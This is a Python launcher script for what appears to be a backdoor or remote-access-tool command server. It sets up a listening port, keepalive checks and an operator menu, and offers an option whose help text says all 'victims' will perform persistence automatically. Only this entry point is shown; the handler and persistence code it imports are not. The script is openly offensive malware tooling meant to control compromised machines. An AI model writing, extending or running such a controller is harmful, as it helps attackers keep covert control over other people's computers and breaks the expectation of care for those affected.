import sys

from scripts.handler import Handler
from scripts.menu import Menu
from scripts.management import Management
from scripts.other import printColor
from scripts.other import myBanner
from scripts.other import exec
import argparse
import time


from colorama import Fore,Style

exec("clear")
print(Fore.GREEN,myBanner(),Fore.BLUE)

parser = argparse.ArgumentParser()
parser.add_argument("-i","--ip", dest="IP", default="", help="the ip address of the server.")
parser.add_argument("-p","--port", dest="PORT", required=True, help="the port number of the server.")
parser.add_argument("-d","--display", action="store_false", default=True, help="disables the display of client information (Logoff and incoming connection).")
parser.add_argument("-t","--time", dest="TIME", type=float, required=True, help="the number of seconds of automatic message sending to check if the connection is alive or dead.")
parser.add_argument("-a","--auto", action="store_true", default=False,help="if the -a or --auto parameter is added then all victims will perform persistence automatically.")

try:
    argv = vars(parser.parse_args())

    HOST = str(argv["IP"])
    PORT = int(argv["PORT"])
    DISPLAY = bool(argv["display"])
    TIME = float(argv["TIME"])
    AUTO = float(argv["auto"])

except SystemExit:
    print("example: /usr/bin/python3 server.py -p 8888 -t 100" )
    exit(0)

else:
    #print("[+] Server started.\n")
    handler= Handler(HOST,PORT,DISPLAY,AUTO)
    management = Management(TIME) #2 secondes.
    menu = Menu()

    handler.daemon=True
    management.daemon=True
   
    handler.start()
    
    while True:
        #Test if the port listening is good.
        time.sleep(1)
        if(handler.start_handler):
            break

    management.start()
    try:
        menu.main()
        printColor("information","[-] Server down...")
    
    except KeyboardInterrupt:
        handler.SuccessfullyQuit() 
        print("[+] By Cisco")
        print("[+] juanrubio.dev@gmail.com")
        print(Style.RESET_ALL) #Restore color terminal
        sys.exit(0)
